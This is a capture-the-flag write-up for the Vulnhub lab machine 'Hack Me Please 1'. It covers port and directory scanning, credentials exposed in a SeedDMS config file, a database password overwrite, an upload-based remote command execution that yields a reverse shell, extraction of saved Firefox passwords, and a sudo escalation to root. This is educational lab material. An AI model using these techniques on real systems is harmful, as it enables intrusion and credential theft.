---
title: Hack Me Please 1
categories: [Writeups, Vulnhub, Linux]
tags: [tcp/80-http/rce,tcp/80-http/web-app-cms-exploit,linux-priv-esc/sudo/misconfig ]
img_path: /Writeups/Vulnhub/Linux/Hack Me Please 1
pin: true
image:
  src: images/Hack Me Please 1
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Recon
## NMAP Complete Scan
```
# Nmap 7.92 scan initiated Mon Jan 31 23:55:15 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/HackMePlease/192.168.110.7/scans/_full_tcp_nmap.txt -oX /root/vulnHub/HackMePlease/192.168.110.7/scans/xml/_full_tcp_nmap.xml 192.168.110.7
adjust_timeouts2: packet supposedly had rtt of -454979 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -454979 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -835237 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -835237 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -834959 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -834959 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -529753 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -529753 microseconds.  Ignoring time.
Nmap scan report for 192.168.110.7
Host is up, received arp-response (0.00089s latency).
Scanned at 2022-01-31 23:55:29 +08 for 62s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Welcome to the land of pwnland
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   syn-ack ttl 64 MySQL 8.0.25-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 1704
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, InteractiveClient, LongColumnFlag, Speaks41ProtocolNew, ODBCClient, Speaks41ProtocolOld, Support41Auth, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, SupportsCompression, FoundRows, SwitchToSSLAfterHandshake, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: b\x15tuL%Q~\x19h\x11v\x11:%<>=e 
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.25_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T00:33:15
| Not valid after:  2031-07-01T00:33:15
| MD5:   98c4 4d26 28a0 4b1c c28e a11d 9b9c 659f
| SHA-1: b293 2106 73a7 114a 3713 3690 a920 e683 27b5 1f83
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjI1X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDcwMzAwMzMxNVoXDTMxMDcwMTAwMzMxNVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4yNV9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCbdAreXsu85u+BsHpJfTRX
| uwIyfy3kD3NM361aBp+C5Gq13qoWWTI795YzwBf4egDV/SsI9LNu8mX4FPoBDK1+
| i/RqDQk11j/TAFwEMzbyT0uu3KSpwwv84L5WUAJP2UxMY47LIrZCGawkSGN8EP95
| zh5xt6qsKdg/WjCSxmr1cEfpBxk9VaGrvenvEqXkM1010ZXC/rrmG/IpC0o+6cX4
| EP9f2PzqZNsvQqI0BzzGJYjq66G/I0zRGk96AzZqzAtehF/euywvmQusUONZEE0k
| q59C+n97+SFXh+goEWnoQfwsfzPFL6vb8rnKEDcQHUN3Wi0HbC2Wig5AM/wolknD
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBACKt6We+
| Hf7qLuEFhhG6nCWakVjuR0iwkrRzHvknKeiTnsCoX0A3ixUjIUoYMnANT9zLz48a
| /4SDFxgLm9BevRyhhgZrjKmXRljYx/3yNo+T0U1zMh3YW8wzRdDMz/j73hTx6Wk6
| mlCHqsrydgejTrtSMf3jnhFgf/R6WVSW5Pnq6B2kantqb1renHTmUrR8H+e82JGm
| oiwmQmNZs2e/07WHDsr5lpeVTfxwh2bvvmmPTuBsEtobKDhc7WVtN3rjs9VxNcgT
| OFr2CnMSdQ5BS8MjFX+j8q4e5Ul2fej+zMadimsVdO2QW8/LF/o1BuFC5P+2HSrn
| XNiJghm6MXoCgsI=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
33060/tcp open  socks5  syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   Radmin: 
|     authentication.mechanisms
|     MYSQL41
|     SHA256_MEMORY
|     doc.formats
|     text
|     client.interactive
|     compression
|     algorithm
|     deflate_stream
|     lz4_message
|     zstd_stream
|     node_type
|     mysql
|     client.pwd_expire_ok
|   SSLv23SessionReq: 
|     Invalid message-frame."
|_    HY000
| socks-auth-info: 
|   No authentication
|   No authentication
|_  No authentication
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.92%I=9%D=1/31%Time=61F8067B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Hello,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20m
SF:essage\"\x05HY000")%r(TerminalServerCookie,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x0
SF:8\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SSLv23SessionRe
SF:q,32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16I
SF:nvalid\x20message-frame\.\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08
SF:\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,
SF:2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0f
SF:Invalid\x20message\"\x05HY000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSear
SF:chReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x
SF:1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unse
SF:rializing\x20protobuf\x20message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(
SF:TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0
SF:\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(DistCCD,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(Radmin,15D,"\x05\0\0\0\x0b\x08\x05\x1a\0P\x01\0\0\x02\n\x0f\n\
SF:x03tls\x12\x08\x08\x01\x12\x04\x08\x07@\0\nM\n\x19authentication\.mecha
SF:nisms\x120\x08\x03\",\n\x11\x08\x01\x12\r\x08\x08J\t\n\x07MYSQL41\n\x17
SF:\x08\x01\x12\x13\x08\x08J\x0f\n\rSHA256_MEMORY\n\x1d\n\x0bdoc\.formats\
SF:x12\x0e\x08\x01\x12\n\x08\x08J\x06\n\x04text\n\x1e\n\x12client\.interac
SF:tive\x12\x08\x08\x01\x12\x04\x08\x07@\0\nn\n\x0bcompression\x12_\x08\x0
SF:2\x1a\[\nY\n\talgorithm\x12L\x08\x03\"H\n\x18\x08\x01\x12\x14\x08\x08J\
SF:x10\n\x0edeflate_stream\n\x15\x08\x01\x12\x11\x08\x08J\r\n\x0blz4_messa
SF:ge\n\x15\x08\x01\x12\x11\x08\x08J\r\n\x0bzstd_stream\n\x1c\n\tnode_type
SF:\x12\x0f\x08\x01\x12\x0b\x08\x08J\x07\n\x05mysql\n\x20\n\x14client\.pwd
SF:_expire_ok\x12\x08\x08\x01\x12\x04\x08\x07@\0");
MAC Address: 08:00:27:02:05:5D (Oracle VirtualBox virtual NIC)
OS fingerprint not ideal because: maxTimingRatio (1.406000e+00) is greater than 1.4
Aggressive OS guesses: Linux 2.6.32 (97%), Dish Network Hopper media device (96%), Linux 2.6.32 or 3.10 (94%), Synology DiskStation Manager 5.1 (93%), Linux 3.0 (93%), Linux 4.4 (93%), Linux 2.6.35 (92%), Linux 2.6.39 (92%), Linux 3.10 - 3.12 (92%), Linux 3.5 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=1/31%OT=80%CT=1%CU=44699%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61F806AF%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T6(R=N)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
U1(R=N)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 44.425 days (since Sat Dec 18 13:43:48 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=250 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.89 ms 192.168.110.7

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 31 23:56:31 2022 -- 1 IP address (1 host up) scanned in 76.70 seconds

```
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/HackMePlease]
└─# ffuf -u  http://192.168.110.7/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.sql' -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.7/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .sql 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 23744, Words: 11302, Lines: 427]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 23744, Words: 11302, Lines: 427]
index.html              [Status: 200, Size: 23744, Words: 11302, Lines: 427]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
:: Progress: [23075/23075] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- No interesting directories enumerated

## TCP/33060 - SOCKS5
### NMAP Scan
```
┌──(root💀kali)-[~/vulnHub/HackMePlease]
└─# nmap -p 33060 $ip --script socks-auth-info -sV -sC -A -v
PORT      STATE SERVICE VERSION
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```
- `mysqlx?`


# Initial Foothold
## TCP/80 - HTTP - SeedDMS Misconfiguration 
1. Proceed to `http://192.168.110.7`
	![](images/Pasted%20image%2020220201004026.png)
2. Proceed to `Contact`
	![](images/Pasted%20image%2020220201004132.png)
	- Tried to do SQLi, failed
3. Take a look at the files being used for this webserver
	![](images/Pasted%20image%2020220201004342.png)
	- `Inspect Element -> Sources` 
1. Proceed to `js/main.js`, found hidden text
	![](images/Pasted%20image%2020220201004524.png)
	- `/seeddms51x/seeddms-5.1.22/`
5. Proceed to `/seeddms51x/seeddms-5.1.22/`
	![](images/Pasted%20image%2020220201012256.png)
	- Tried SQLi Auth Bypass, failed
	- Tried Default Creds, admin:admin, failed
6. [Download](https://sourceforge.net/projects/seeddms/files/seeddms-5.1.22/seeddms-quickstart-5.1.22.tar.gz/download) `seeddms-5.1.22` to analyze the directory structure
7. Directory Structure of `seeddms-5.1.22`
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit]
	└─# tree -d seeddms51x/ -L 1
	seeddms51x/
	├── conf
	├── data
	├── pear
	├── seeddms -> seeddms-5.1.22
	├── seeddms-5.1.22
	└── www
	6 directories
	```
	- `seeddms51x`,
		-  matches our URL
	- `conf` 
		-  usually contains sensitive/configuration information
8. View `conf`directory
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit]
	└─# tree -a seeddms51x/conf/ 
	seeddms51x/conf/
	├── .htaccess
	├── settings.xml
	├── settings.xml.template
	└── stopwords.txt
	```
	![](images/Pasted%20image%2020220201014045.png)
	- If we are able to view `settings.xml`, we are able to obtain SQL/SMTP credentials
9. Proceed to `http://192.168.110.7/seeddms51x/conf/settings.xml`
	![](images/Pasted%20image%2020220201014551.png)
	- seeddms:seeddms
	
## TCP/3306 - mysql
1. Access SQL w/ seeddms:seeddms
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease]
	└─# mysql -h $ip -u seeddms -p
	Enter password: seeddms
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 2015
	Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

	MySQL [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| mysql              |
	| performance_schema |
	| seeddms            |
	| sys                |
	+--------------------+
	5 rows in set (0.160 sec)

	MySQL [(none)]> use seeddms;

	MySQL [seeddms]> show tables;
	+------------------------------+
	| Tables_in_seeddms            |
	+------------------------------+
	| tblACLs                      |
	| tblAttributeDefinitions      |
	| tblCategory                  |
	| tblDocumentApproveLog        |
	| ...			       |	
	| tblUsers		       |
	| tblWorkflows                 |
	| users                        |
	+------------------------------+
	43 rows in set (0.002 sec)

	MySQL [seeddms]> show columns from users;
	+---------------------+--------------+------+-----+---------+----------------+
	| Field               | Type         | Null | Key | Default | Extra          |
	+---------------------+--------------+------+-----+---------+----------------+
	| Employee_id         | int          | NO   | PRI | NULL    | auto_increment |
	| Employee_first_name | varchar(500) | NO   |     | NULL    |                |
	| Employee_last_name  | varchar(500) | NO   |     | NULL    |                |
	| Employee_passwd     | varchar(500) | YES  |     | NULL    |                |
	+---------------------+--------------+------+-----+---------+----------------+
	4 rows in set (0.002 sec)


	MySQL [seeddms]> SELECT * FROM users;
	+-------------+---------------------+--------------------+-----------------+
	| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
	+-------------+---------------------+--------------------+-----------------+
	|           1 | saket               | saurav             | Saket@#$1337    |
	+-------------+---------------------+--------------------+-----------------+
	1 row in set (0.001 sec)
	```
	- Tried to login w/ 
		- saket:`Saket@#$1337`
		- 1:`Saket@#$1337`
		- saurav:`Saket@#$1337`
	- This is not the table that stores login credentials
2. View `tblUsers;`
	```
	MySQL [seeddms]> show columns from tblUsers;
	+---------------+--------------+------+-----+---------+----------------+
	| Field         | Type         | Null | Key | Default | Extra          |
	+---------------+--------------+------+-----+---------+----------------+
	| id            | int          | NO   | PRI | NULL    | auto_increment |
	| login         | varchar(50)  | YES  | UNI | NULL    |                |
	| pwd           | varchar(50)  | YES  |     | NULL    |                |
	| fullName      | varchar(100) | YES  |     | NULL    |                |
	| email         | varchar(70)  | YES  |     | NULL    |                |
	| language      | varchar(32)  | NO   |     | NULL    |                |
	| theme         | varchar(32)  | NO   |     | NULL    |                |
	| comment       | text         | NO   |     | NULL    |                |
	| role          | smallint     | NO   |     | 0       |                |
	| hidden        | smallint     | NO   |     | 0       |                |
	| pwdExpiration | datetime     | YES  |     | NULL    |                |
	| loginfailures | tinyint      | NO   |     | 0       |                |
	| disabled      | smallint     | NO   |     | 0       |                |
	| quota         | bigint       | YES  |     | NULL    |                |
	| homefolder    | int          | YES  | MUL | NULL    |                |
	+---------------+--------------+------+-----+---------+----------------+
	15 rows in set (0.003 sec)

	MySQL [seeddms]> SELECT id,pwd,fullName, email FROM tblUsers;
	+----+----------------------------------+---------------+--------------------+
	| id | pwd                              | fullName      | email              |
	+----+----------------------------------+---------------+--------------------+
	|  1 | 5f4dcc3b5aa765d61d8327deb882cf99 | Administrator | address@server.com |
	|  2 | NULL                             | Guest User    | NULL               |
	+----+----------------------------------+---------------+--------------------+
	2 rows in set (0.001 sec)

	MySQL [seeddms]> UPDATE tblUsers
		-> SET pwd = '5f4dcc3b5aa765d61d8327deb882cf99'
		-> WHERE ID = 1;
	Query OK, 1 row affected (0.072 sec)
	Rows matched: 1  Changed: 1  Warnings: 0
	```
3. Login w/ admin:password
	![](images/Pasted%20image%2020220201021053.png)

## Back to TCP/80 - HTTP - SeedDMS RCE
1. Search exploits for `seeddms-5.1.22`

	| Exploit Title                                                   | Path                  |
	| --------------------------------------------------------------- | --------------------- |
	| Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) | php/webapps/50062.py  |
	| SeedDMS versions < 5.1.11 - Remote Command Execution            | php/webapps/47022.txt |

2. Tried `php/webapps/50062.py`, did not work
3. View `php/webapps/47022.txt`
	![](images/Pasted%20image%2020220201023437.png)
4. Exploit
	1. Add a document
		![](images/Pasted%20image%2020220201023802.png)
		- Take note of 
			- Document ID: 6
			- Version: 1
	2. Execute reverse shell
		- Proceed to `seeddms51x/data/1048576/6/1.php`
	3. Obtain www-data shell
		![](images/Pasted%20image%2020220201024310.png)

## Alternate Way - Log File
1. Fuzz directory for log files
	```
		┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# ffuf -u http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.log.bak,.log,.bak'
			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .txt .php .log.bak .log .bak 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
	access.log.bak          [Status: 200, Size: 81876, Words: 5393, Lines: 341]
	controllers             [Status: 301, Size: 346, Words: 20, Lines: 10]
	doc                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	inc                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
	index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
	install                 [Status: 301, Size: 342, Words: 20, Lines: 10]
	languages               [Status: 301, Size: 344, Words: 20, Lines: 10]
	op                      [Status: 301, Size: 337, Words: 20, Lines: 10]
	out                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	styles                  [Status: 301, Size: 341, Words: 20, Lines: 10]
	utils                   [Status: 301, Size: 340, Words: 20, Lines: 10]
	views                   [Status: 301, Size: 340, Words: 20, Lines: 10]
	webdav                  [Status: 301, Size: 341, Words: 20, Lines: 10]
	:: Progress: [32305/32305] :: Job [1/1] :: 4856 req/sec :: Duration: [0:00:05] :: Errors: 0 
	```
	- `access.log.bak`
2. Download & Obtain password
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# wget http://192.168.110.7/seeddms51x/seeddms-5.1.22/access.log.bak -q
	
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# cat access.log.bak | grep password
	127.0.0.1 - - [03/Jul/2021:00:01:12 -0700] "GET /seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&password='HacK@#$L33T$%!@' HTTP/1.1" 401 4252 "/seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&password=HacK@#$L33T$%!@" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0"
	```
	- admin:`HacK@#$L33T$%!@`
3. Login w/ admin:`HacK@#$L33T$%!@`
4. Upload Reverse shell

# Privilege Escalation
## Saket - Via Creds Found
1. Earlier, we obtained Saket's credentials
2. Switch to saket w/ saket:`Saket@#$1337`
	![](images/Pasted%20image%2020220201024743.png)
## Root - Via Sudo
1. After browsing through saket's home directory, there are firefox files
2. Obtain firefox files to extract password from it
	```
	saket@ubuntu:~$ find $(pwd)find $(pwd) 2>/dev/null | grep "key\|cookies\|logins\|cert"
	/home/saket/.gnupg/private-keys-v1.d
	/home/saket/.local/share/keyrings
	/home/saket/.local/share/keyrings/user.keystore
	/home/saket/.local/share/keyrings/login.keyring
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/key4.db
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/logins.json
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cert9.db
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/logins-backup.json
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite-wal
	```
	- `key4.db`
	- `cookies.sqlite`
	- `logins.json`
	- `cert9.db`
3. Transfer to kali
4. Decrypt it
	```
	┌──(root💀kali)-[~/tools/firefox_decrypt]
	└─# python3 firefox_decrypt.py ~/vulnHub/HackMePlease/192.168.110.7/loot/firefox/
	2022-02-01 02:54:02,743 - WARNING - profile.ini not found in /root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/
	2022-02-01 02:54:02,743 - WARNING - Continuing and assuming '/root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/' is a profile location

	Website:   http://127.0.0.1
	Username: 'seeddms'
	Password: 'seedms'
	```
	- seeddms:seedms
5. Tried to switch to root w/ seeddms:seedms, failed
6. Check for sudo access
	```
	saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo -l
	[sudo] password for saket: 
	Matching Defaults entries for saket on ubuntu:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User saket may run the following commands on ubuntu:
		(ALL : ALL) ALL
	saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo su
	```
7. Obtain root
	![](images/Pasted%20image%2020220201040217.png)



